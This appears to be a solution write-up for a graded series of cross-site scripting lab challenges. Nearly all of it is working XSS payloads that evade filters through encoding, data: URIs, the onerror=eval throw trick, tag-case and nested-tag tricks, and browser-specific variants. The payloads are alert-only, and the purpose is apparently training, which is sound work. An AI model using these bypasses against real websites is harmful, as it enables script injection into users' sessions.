# 1
`<script>alert("XSS")</script>`
# 2
`<img src=x onerror="alert(document.domain)" />`
# 3
`javascript:alert("XSS")`
# 4-1
- Encode `<img src=x onerror="alert('XSS')" />` to hex
`\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x22\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x22\x20\x2f\x3e`
# 4-2
`${String.fromCharCode(60)}img src=a onerror="alert('XSS')" /${String.fromCharCode(62)}`
`${String.fromCharCode(60)}img src=a onerror="alert(doc${String.fromCharCode(117)}ment.domain)" /${String.fromCharCode(62)}`

# 5
- use [jjencode](http://utf-8.jp/public/jjencode.html)

# 6-1
- html entities is not safe in onerror
- encode `alert(document.domain)`
    - `<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x64;&#x6F;&#x6D;&#x61;&#x69;&#x6E;&#x29;">`

# 6-2
- cannot use onerror
- use `data:` uri at script src
    - [data uri](https://developer.mozilla.org/ja/docs/Web/HTTP/Basics_of_HTTP/Data_URIs)
- `<script src="data:text/plain;base64,YWxlcnQoIlhTUyIp"></script>`
- `<script src="data:text/plain;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>`

# 6-3
- cannot use onerror, onclick or anything like these

- encode `javascript:alert("XSS")` in html entities and set it as href
- `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;">click</a>`

- or `javascript:alert(document.domain)`
- `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x64;&#x6F;&#x6D;&#x61;&#x69;&#x6E;&#x29;>click</a>`


# 7-1
- `<script>alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83))</script>`
- `<script>alert(String.fromCharCode(88,83,83))</script>`
- `<script>alert(document.domain)</script>`

# 7-2
- Same as 7-1

# 8-1
- We can inject payload at span id
    - `<span id="{escaped_payload}">`
    - Can't use `()<>`
- Use onclick and html entities
- `" onclick="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;""`
- Activate XSS by clicking span tag
- `" onclick="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x64;&#x6F;&#x6D;&#x61;&#x69;&#x6E;&#x29;""`

# 8-2
- Use technique to XSS without parentheses
    - [XSS without parentheses](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
- e.g., `onerror=alert;throw 1;`
    - this will show an alert window with the following message: "Uncaught 1"
    - By default since the exception is "Uncaught" the onerror function is called with "Uncaught" as the argument
    - and the threwn object (?) is appended

- So to use eval at onerror we need to handle the default argument "Uncaught" properly so the javascript intepreter will not experience syntax errors

- Try to make it like `onerror=eval; throw '=1; alert("XSS")'`
    - The actual eval should look like `eval('Uncaught=1; alert("XSS")')`

- Or for short try something like `onerror=eval; throw'=alert("XSS")'`
    - The actual eval should look like `eval('Uncaught=alert("XSS")'`

## Answer
### Chrome
- `" onclick="window.onerror=eval; throw '=alert\x28\x22XSS\x22\x29'""`
    - Don't forget the **window** at `window.onerror`
    - Don't forget to use hex for " and () at `alert("XSS")`
- `" onclick="window.onerror=eval; throw '=alert\x28document.domain\x29'""`
### Firefox
- `" onmouseover="window.onerror=eval; throw {lineNumber:1,columnNumber:2,fileName:1,message:'alert\x28\x22XSS\x22\x29'}`
- `" onmouseover="window.onerror=eval; throw {lineNumber:1,columnNumber:2,fileName:1,message:'alert\x28document.domain\x29'}`


# 9-1
- Use capital letters
- `<SCRIPT>alert("XSS")</SCRIPT>`
- `<SCRIPT>alert(document.domain)</SCRIPT>`

# 9-2
- Exploit regex replacement
- `<sscriptcript>alert("XSS")</sscriptcript>`
- `<sscriptcript>alert(document.domain)</sscriptcript>`

- Or this
- `<img/src/onerror=alert("XSS")>`
    - [xss without spaces](https://gist.github.com/m1el/5093530)
